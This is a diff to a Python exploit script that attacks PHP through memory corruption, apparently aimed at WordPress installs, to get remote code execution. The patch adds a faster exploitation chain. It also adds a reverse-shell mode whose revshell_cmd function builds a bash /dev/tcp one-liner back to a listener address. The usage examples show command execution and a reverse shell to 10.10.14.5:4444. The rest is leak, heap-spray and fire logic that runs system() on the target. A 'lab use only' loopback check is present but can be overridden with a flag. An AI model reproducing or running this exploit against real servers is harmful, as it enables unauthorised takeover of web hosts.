@@ -17,12 +17,24 @@ Full chain, pure display_errors=Off, ASLR on, default prefork pool:
                 zend_reference -> fake HashTable(pDestructor=zif_system); the
                 session cleanup runs system(cmd).
 
-Engine (Leak/Fire/Endpoint/decode_bases) lives in engine.py next to this file.
+By default the FIRE (and its arming OOM) use the fast amplification chain
+(engine.Fast, 9bie technique - github.com/9bie/php2shell-bypass-aslr-exp):
+a few hundred KB of nested empty-file $_FILES parts reach memory_limit instead
+of streaming 128 MB, the OOM bailout is non-corrupting (no crash-rotate), and
+the fire lands in ~1-2 attempts. Pass --stock for the slow 128 MB baseline.
+
+Two showcased modes: RCE (--cmd, <=200 bytes on the fast chain) and reverse
+shell (--lhost/--lport; the whole bash one-liner fits the 200-byte fire slot,
+so no session staging is needed). Engine lives in engine.py next to this file.
 Lab use only; target must be loopback unless --allow-lan.
 
 usage:
-  python3 php2shell_wp.py --url http://127.0.0.1:8080/wp-content/index.php \
-      --blockers 149 --table-off 0x690d8 --cmd 'id>/tmp/p'
+  # RCE
+  python3 php2shell.py --url http://127.0.0.1:8080/index.php --cmd 'id>/tmp/p'
+  # reverse shell (start a listener on LHOST:LPORT first)
+  python3 php2shell.py --url http://127.0.0.1:8080/index.php --lhost 10.10.14.5 --lport 4444
+  # slow stock baseline
+  python3 php2shell.py --url http://127.0.0.1:8080/index.php --stock --cmd 'id>/tmp/p'
 """
 import argparse, base64, socket, sys, threading, time, urllib.parse
 import engine as S
@@ -132,22 +144,63 @@ def revshell_run(host, port, args):
     return 0
 
 
+def revshell_cmd(lhost, lport):
+    """Direct reverse-shell command for the fast fire's 200-byte command slot -
+    system() runs it via sh, so no PHP payload / session staging is needed."""
+    return "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (lhost, lport)
+
+
+def fast_run(host, port, args, command, shell=False):
+    """Default chain: our leak once, then the 9bie amplification arm + fake-ref
+    fire per attempt (engine.Fast). Each fire is a light request (no 128 MB OOM,
+    no crash-rotate), so it lands in ~1-2 attempts. Credit: 9bie."""
+    stop = threading.Event()
+    print("[*] saturating pool with %d blockers" % args.blockers, flush=True)
+    run_blockers(host, port, args.blockers, stop)
+    time.sleep(2.0)
+    http = S.Endpoint(args.url, 120.0)
+    heap, module = S.Leak(http, DTOR, True).run(args.leak_tries)
+    if not heap or not module:
+        stop.set(); print("[-] LEAK FAILED"); return 1
+    print("[+] LEAK chunk=%#x libphp=%#x" % (heap, module), flush=True)
+    fast = S.Fast(http, ZIF, True)
+    if shell:
+        print("[*] reverse shell -> %s:%s (start your listener first)" % (args.lhost, args.lport), flush=True)
+    for i in range(1, args.fire_tries + 1):
+        fast.run(heap, module, command, s_offset=args.s_off)
+        print("[*] fast arm+fire %d/%d (S=chunk+%#x)" % (i, args.fire_tries, args.s_off), flush=True)
+    stop.set(); time.sleep(0.3)
+    if shell:
+        print("[+] done; on a landed fire bash connected back to %s:%s" % (args.lhost, args.lport))
+    else:
+        print("[+] done. chunk=%#x libphp=%#x - verify the command result" % (heap, module))
+    return 0
+
+
 def main():
     ap = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
     ap.add_argument("--url", required=True, help="cheap PHP stub, e.g. .../wp-content/index.php")
-    ap.add_argument("--cmd", default="id>/tmp/p", help="command, <=14 bytes")
+    ap.add_argument("--cmd", default="id>/tmp/p",
+                    help="command to run (RCE); fast chain <=200 bytes, --stock <=14")
     ap.add_argument("--blockers", type=int, default=149,
                     help="MaxRequestWorkers-1 (default 149 for the 150 pool)")
-    ap.add_argument("--table-off", type=lambda v: int(v, 0), default=DEFAULT_TABLE_OFF)
-    ap.add_argument("--sweep-table", action="store_true",
-                    help="brute the fake-HT landing over the dense spray block")
-    ap.add_argument("--sweep-span", type=lambda v: int(v, 0), default=0x3000)
     ap.add_argument("--leak-tries", type=int, default=3)
     ap.add_argument("--fire-tries", type=int, default=6)
     ap.add_argument("--allow-lan", action="store_true")
-    ap.add_argument("--lhost", help="reverse shell: your listener IP (stages a session + fires php /tmp/s*)")
+    ap.add_argument("--lhost", help="reverse shell: your listener IP")
     ap.add_argument("--lport", default="4444", help="reverse shell: your listener port")
+    ap.add_argument("--s-off", type=lambda v: int(v, 0), default=S.FAST_S_OFFSET,
+                    help="fast-fire address (chunk-relative, default %#x; "
+                         "recalibrate per build)" % S.FAST_S_OFFSET)
+    ap.add_argument("--stock", action="store_true",
+                    help="use the slow 128 MB stock chain instead of the default "
+                         "fast 9bie amplification chain")
+    ap.add_argument("--table-off", type=lambda v: int(v, 0), default=DEFAULT_TABLE_OFF,
+                    help="--stock only: fake-HashTable landing offset")
+    ap.add_argument("--sweep-table", action="store_true",
+                    help="--stock only: brute the fake-HT landing over the spray block")
+    ap.add_argument("--sweep-span", type=lambda v: int(v, 0), default=0x3000)
     args = ap.parse_args()
 
     u = urllib.parse.urlsplit(args.url)
@@ -155,24 +208,31 @@ def main():
     if host not in ("127.0.0.1", "localhost", "::1") and not args.allow_lan:
         sys.exit("refusing non-loopback target without --allow-lan")
 
+    # ---- default: fast 9bie amplification chain (RCE via --cmd, shell via --lhost)
+    if not args.stock:
+        if args.lhost:
+            command, shell = revshell_cmd(args.lhost, args.lport).encode(), True
+        else:
+            command, shell = args.cmd.encode(), False
+        if not command or len(command) > S.FAST_MAX_COMMAND or b"\0" in command:
+            sys.exit("--cmd must be 1-%d bytes, no NUL" % S.FAST_MAX_COMMAND)
+        return fast_run(host, port, args, command, shell=shell)
+
+    # ---- --stock: slow 128 MB chain (educational baseline) ---------------
     if args.lhost:
         return revshell_run(host, port, args)
-
     cmd = args.cmd.encode()
     if not cmd or len(cmd) > 14 or b"\0" in cmd:
-        sys.exit("--cmd must be 1-14 bytes, no NUL")
-
+        sys.exit("--stock --cmd must be 1-14 bytes, no NUL")
     stop = threading.Event()
     print(f"[*] saturating pool with {args.blockers} blockers", flush=True)
     run_blockers(host, port, args.blockers, stop)
     time.sleep(2.0)
-
     http = S.Endpoint(args.url, 90.0)
     heap, module = S.Leak(http, DTOR, True).run(args.leak_tries)
     if not heap or not module:
         stop.set(); sys.exit("[-] LEAK FAILED")
     print(f"[+] LEAK chunk={heap:#x} libphp={module:#x}", flush=True)
-
     fire = S.Fire(http, ZIF, DTOR, True)
     offs = ([args.table_off] if not args.sweep_table else
             list(range(args.table_off - args.sweep_span,
